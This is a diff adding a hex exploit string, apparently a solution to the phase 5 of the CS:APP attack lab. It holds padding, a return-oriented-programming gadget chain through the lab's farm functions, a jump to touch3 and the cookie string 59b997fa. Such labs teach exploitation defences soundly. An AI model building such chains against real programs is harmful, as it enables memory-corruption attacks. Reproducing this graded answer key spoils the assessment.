@@ -1,0 +1,14 @@
+48 89 e7 68 fa 18 40 00 c3 61 61 61 61 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87  
+/* 40 bytes of padding */
+06 1a 40 00 00 00 00 00   /* addr to gadgets: movq %rsp, %rax; ret in addval_190  addval_190 */
+c5 19 40 00 00 00 00 00   /* addr to gadgets: movq %rax, %rdi; ret; in setval_426 func  */  
+ab 19 40 00 00 00 00 00   /* addr to gadgets: popq %rax; nop; ret; in addval_219 func   */
+48 00 00 00 00 00 00 00   /* offset 56 = 0x38 */
+dd 19 40 00 00 00 00 00   /* addr to gadgets: movl %eax, %edx; nop; ret; in getval_481   */
+69 1a 40 00 00 00 00 00   /* addr to gadgets: movl %edx, %ecx; nop; ret; in getval_311   */
+13 1a 40 00 00 00 00 00   /* addr to gadgets: movl %ecx, %esi; nop; ret; in addval_436   */
+d6 19 40 00 00 00 00 00   /* addr to gadgets: leaq (%rdi, %rsi,1), %rax; ret in add_xy   */
+c5 19 40 00 00 00 00 00   /* addr to gadgets: movq %rax, %rdi; ret; in setval_426 func   */ 
+fa 18 40 00 00 00 00 00   /* addr to touch3 */
+35 39 62 39 39 37 66 61   /* string 59b997fa\0 */ 
+00                        /* null terminator */
